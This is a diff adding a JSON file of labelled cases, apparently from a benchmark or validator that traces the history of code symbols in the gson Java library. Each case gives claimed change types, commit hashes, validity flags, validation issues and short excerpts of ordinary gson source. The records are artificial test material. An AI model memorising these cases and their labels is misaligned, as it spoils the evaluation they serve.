+      "parents": [
+        "961517decce0aa907c285c19d8b93d5c746ecdcb"
+      ],
+      "is_direct_parent": true,
+      "diff_lines_count": 39,
+      "diff_lines": [
+        "-    // Using recommended hashing algorithm from Effective Java for longs and doubles",
+        "+    // The conditions below parallel the structure of equals(Object). Unlike in equals, every",
+        "+    // numeric branch must delegate to the same double-based hash: equals can consider primitives",
+        "+    // from *different* branches equal (for example Integer 42 equals Double 42.0 and a lazily",
+        "+    // parsed number 42 through the floating-point comparison), so a branch hashing anything other",
+        "+    // than the double value would give equal primitives different hash codes, see",
+        "+    // https://github.com/google/gson/issues/992",
+        "-      long value = getAsNumber().longValue();",
+        "-      return (int) (value ^ (value >>> 32));",
+        "+      // equals compares two integral primitives by their BigInteger values or long values;"
+      ]
+    }
+  },
+  {
+    "case_id": "java_gsn_06",
+    "language": "java",
+    "repo": "gson",
+    "claimed_type": "new_symbol",
+    "cur_symbol": "compareTo",
+    "cur_file": "gson/src/main/java/com/google/gson/internal/LazilyParsedNumber.java",
+    "cur_commit": "4b46b6ce6c175d0742a6f9f813219053fb5e36c3",
+    "pred_symbol": null,
+    "pred_file": null,
+    "pred_commit": null,
+    "is_valid_pred": false,
+    "issues": [],
+    "details": {}
+  },
+  {
+    "case_id": "java_gsn_07",
+    "language": "java",
+    "repo": "gson",
+    "claimed_type": "move",
+    "cur_symbol": "JavaTimeTypeAdapters",
+    "cur_file": "gson/src/main/java/com/google/gson/internal/bind/JavaTimeTypeAdapters.java",
+    "cur_commit": "c47db7bc13875db690bcfb76e02b1e1bbb3a3353",
+    "pred_symbol": "JavaTimeTypeAdapters",
+    "pred_file": "extras/src/main/java/com/google/gson/typeadapters/JavaTimeTypeAdapters.java",
+    "pred_commit": "dfc1ce001b46cb1c022012aa08152852b67dbdc9",
+    "is_valid_pred": true,
+    "issues": [
+      "Predecessor file extras/src/main/java/com/google/gson/typeadapters/JavaTimeTypeAdapters.java does not exist at dfc1ce00"
+    ],
+    "details": {
+      "parents": [
+        "dfc1ce001b46cb1c022012aa08152852b67dbdc9"
+      ],
+      "is_direct_parent": true,
+      "diff_lines_count": 449,
+      "diff_lines": [
+        "+package com.google.gson.internal.bind;",
+        "+",
+        "+import static java.lang.Math.toIntExact;",
+        "+",
+        "+import com.google.gson.Gson;",
+        "+import com.google.gson.JsonSyntaxException;",
+        "+import com.google.gson.TypeAdapter;",
+        "+import com.google.gson.TypeAdapterFactory;",
+        "+import com.google.gson.internal.bind.TypeAdapters.IntegerFieldsTypeAdapter;",
+        "+import com.google.gson.reflect.TypeToken;"
+      ]
+    }
+  },
+  {
+    "case_id": "java_gsn_08",
+    "language": "java",
+    "repo": "gson",
+    "claimed_type": "rewrite",
+    "cur_symbol": "promoteNameToValue",
+    "cur_file": "gson/src/main/java/com/google/gson/stream/JsonReader.java",
+    "cur_commit": "b3f4ca20087f9066de4c340522ff84e0558e1ad1",
+    "pred_symbol": "promoteNameToValue",
+    "pred_file": "gson/src/main/java/com/google/gson/stream/JsonReader.java",
+    "pred_commit": "61f2c646066e959f65cb99a826a2a759be42dbdd",
+    "is_valid_pred": true,
+    "issues": [],
+    "details": {
+      "parents": [
+        "61f2c646066e959f65cb99a826a2a759be42dbdd"
+      ],
+      "is_direct_parent": true,
+      "diff_lines_count": 29,
+      "diff_lines": [
+        "+  /**",
+        "+   * Whether {@link JsonReaderInternalAccess#promoteNameToValue} converted the current property name",
+        "+   * to a value without recording it in {@link #pathNames} yet.",
+        "+   */",
+        "+  private boolean promotedName;",
+        "+",
+        "+  /** Records a promoted property name in the JSON path after it has been consumed as a value. */",
+        "+  private void recordPromotedName(String name) {",
+        "+    if (promotedName) {",
+        "+      pathNames[stackSize - 1] = name;"
+      ]
+    }
+  },
+  {
+    "case_id": "java_gsn_09",
+    "language": "java",
+    "repo": "gson",
+    "claimed_type": "hard_negative",
+    "cur_symbol": "checkNotNull",
+    "cur_file": "gson/src/main/java/com/google/gson/internal/$Gson$Preconditions.java",
+    "cur_commit": "164ac9dfe1e9b056faf5e37ec1a2baaf4681dc4f",
+    "pred_symbol": "checkArgument",
+    "pred_file": "gson/src/main/java/com/google/gson/internal/$Gson$Preconditions.java",
+    "pred_commit": "81d15f545d98e902ff1ebdb9c239f1719b3bc3aa",
+    "is_valid_pred": false,
+    "issues": [
+      "Current file gson/src/main/java/com/google/gson/internal/$Gson$Preconditions.java does not exist at 164ac9df",
+      "Predecessor file gson/src/main/java/com/google/gson/internal/$Gson$Preconditions.java does not exist at 81d15f54"
+    ],
+    "details": {
+      "parents": [
+        "81d15f545d98e902ff1ebdb9c239f1719b3bc3aa"
+      ],
+      "is_direct_parent": true,
+      "diff_lines_count": 0
+    }
+  },
+  {
+    "case_id": "java_gsn_10",
+    "language": "java",
+    "repo": "gson",
+    "claimed_type": "hard_negative",
+    "cur_symbol": "toJsonTree",
+    "cur_file": "gson/src/main/java/com/google/gson/Gson.java",
+    "cur_commit": "8526dbd2f0a7e61d5fbcc5caa163f2352fb0ddc0",
+    "pred_symbol": "fromJsonTree",
+    "pred_file": "gson/src/main/java/com/google/gson/Gson.java",
+    "pred_commit": "286843d4a90a4690e5e1f438c944569b3fbfb1d2",
+    "is_valid_pred": false,
+    "issues": [
+      "Predecessor symbol 'fromJsonTree' not found in gson/src/main/java/com/google/gson/Gson.java at 286843d4"
+    ],
+    "details": {
+      "parents": [
+        "286843d4a90a4690e5e1f438c944569b3fbfb1d2"
+      ],
+      "is_direct_parent": true,
+      "diff_lines_count": 206,
+      "diff_lines": [
+        "-import static com.google.gson.internal.bind.TypeAdapters.atomicLongAdapter;",
+        "-import static com.google.gson.internal.bind.TypeAdapters.atomicLongArrayAdapter;",
+        "+import static com.google.gson.GsonBuilder.newImmutableList;",
+        "-import com.google.gson.internal.bind.ArrayTypeAdapter;",
+        "-import com.google.gson.internal.bind.CollectionTypeAdapterFactory;",
+        "-import com.google.gson.internal.bind.DefaultDateTypeAdapter;",
+        "-import com.google.gson.internal.bind.MapTypeAdapterFactory;",
+        "-import com.google.gson.internal.bind.NumberTypeAdapter;",
+        "-import com.google.gson.internal.bind.ObjectTypeAdapter;",
+        "-import com.google.gson.internal.bind.ReflectiveTypeAdapterFactory;"
+      ]
+    }
+  }
+]
